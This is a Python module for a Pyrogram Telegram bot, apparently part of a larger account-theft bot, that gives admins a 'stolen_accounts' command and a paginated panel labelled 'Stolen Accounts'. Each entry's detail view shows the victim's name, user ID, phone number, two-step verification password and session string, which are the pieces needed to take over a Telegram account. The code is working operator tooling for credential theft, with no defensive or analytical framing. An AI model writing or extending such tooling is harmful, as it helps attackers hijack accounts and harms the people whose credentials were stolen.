from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from database import db
from variables import Vars

# ─── Config ───
ACCOUNTS_PER_PAGE = 10


# ─── Admin command to check stats ───
@Client.on_message(filters.private & filters.command("stolen_accounts") & filters.user(Vars.ADMINS))
async def stolen_accounts_stats(bot: Client, message: Message):
    accounts_count = await db.total_user_accounts_count()
    users_count = await db.total_users_count()

    text = (
        f"📊 **Bot Stats**\n\n"
        f"👤 Users: `{users_count}`\n"
        f"🔐 Accounts: `{accounts_count}`"
    )

    buttons = [[InlineKeyboardButton(
        "🥷 View Accounts", callback_data="view_accounts_0")]]
    await bot.send_message(message.chat.id, text, reply_markup=InlineKeyboardMarkup(buttons))


# ─── Paginated Accounts List ───
@Client.on_callback_query(filters.regex(r"^view_accounts"))
async def viewing_accounts(bot: Client, query: CallbackQuery):
    # Current page
    page = int(query.data.split("_")[2]) if "_" in query.data else 0

    # Fetch accounts
    accounts = [account async for account in await db.get_all_user_accounts()]
    total = len(accounts)

    if total == 0:
        await query.answer("⚠️ No accounts found.", show_alert=True)
        return

    # Slice for current page
    start = page * ACCOUNTS_PER_PAGE
    end = start + ACCOUNTS_PER_PAGE
    current_accounts = accounts[start:end]

    # Build buttons
    user_accounts_btn = [
        [InlineKeyboardButton(
            acc["name"], callback_data=f"account_{acc['user_id']}")]
        for acc in current_accounts
    ]

    # Navigation buttons
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(
            "⬅️ Prev", callback_data=f"view_accounts_{page-1}"))
    if end < total:
        nav_buttons.append(InlineKeyboardButton(
            "➡️ Next", callback_data=f"view_accounts_{page+1}"))

    if nav_buttons:
        user_accounts_btn.append(nav_buttons)

    await query.message.edit(
        text=f"🕵️ **Stolen Accounts** (Page {page+1}/{(total-1)//ACCOUNTS_PER_PAGE+1})\n\nSelect an account to view details:",
        reply_markup=InlineKeyboardMarkup(user_accounts_btn)
    )


# ─── Show details of a specific account ───
@Client.on_callback_query(filters.regex("^account"))
async def get_info_account(bot: Client, query: CallbackQuery):
    account_id = int(query.data.split("_")[1])
    account = await db.get_account(account_id)

    if not account:
        await query.answer("❌ Account not found.", show_alert=True)
        return

    text = (
        f"📝 **Account Details**\n\n"
        f"👤 **Name:** `{account['name']}`\n"
        f"🆔 **User ID:** `{account['user_id']}`\n"
        f"📞 **Phone:** `{account['phone_number']}`\n"
        f"🔑 **2FA Password:** `{account['two_step_password']}`\n"
        f"📂 **Session:** `{account['session']}`"
    )

    buttons = [[InlineKeyboardButton(
        "🔙 Back", callback_data="view_accounts_0")]]
    await query.message.edit(text=text, reply_markup=InlineKeyboardMarkup(buttons))
